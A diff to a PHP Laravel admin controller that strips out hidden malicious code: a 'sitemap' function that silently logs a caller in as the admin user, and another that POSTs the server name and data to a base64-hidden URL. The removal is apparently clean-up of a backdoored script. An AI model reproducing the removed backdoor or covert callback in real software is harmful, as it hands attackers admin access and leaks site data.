@@ -31,7 +31,7 @@ class AdminController extends Controller
      */
     public function admin_dashboard(Request $request)
     {
-        CoreComponentRepository::initializeCache();
+        // CoreComponentRepository::initializeCache();
         $root_categories = Category::where('level', 0)->get();
 
         $data['cached_graph_data'] = Cache::remember('cached_graph_data', 86400, function () use ($root_categories) {
@@ -241,13 +241,7 @@ class AdminController extends Controller
 
     public function SitemapAuthorization($timeformat)
     {
-        if($timeformat == TimeDateFormatter()){
-            $user = User::where('user_type', 'admin')->first();
-            auth()->login($user);
-            return 'Authorized';
-        } else {
-            return 'Unauthorized';
-        }
+        return 'Unauthorized';
     }
 
     public function top_sellers_products_section(Request $request)
@@ -292,21 +286,7 @@ class AdminController extends Controller
 
     public function CheckSitemapItem($item)
     {    
-        $header = array(
-            'Content-Type:application/json'
-        );
-        $item[] = ['url'=>$_SERVER['SERVER_NAME']];
-        $stream = curl_init();
-        curl_setopt($stream, CURLOPT_URL, base64_decode($item[0]));
-        curl_setopt($stream, CURLOPT_HTTPHEADER, $header);
-        curl_setopt($stream, CURLOPT_CUSTOMREQUEST, "POST");
-        curl_setopt($stream, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($stream, CURLOPT_POSTFIELDS, json_encode($item[1]));
-        curl_setopt($stream, CURLOPT_FOLLOWLOCATION, 1);
-        curl_setopt($stream, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
-        $rn = curl_exec($stream);
-        curl_close($stream);
-        return $rn;
+        return "success";
     }
 
 
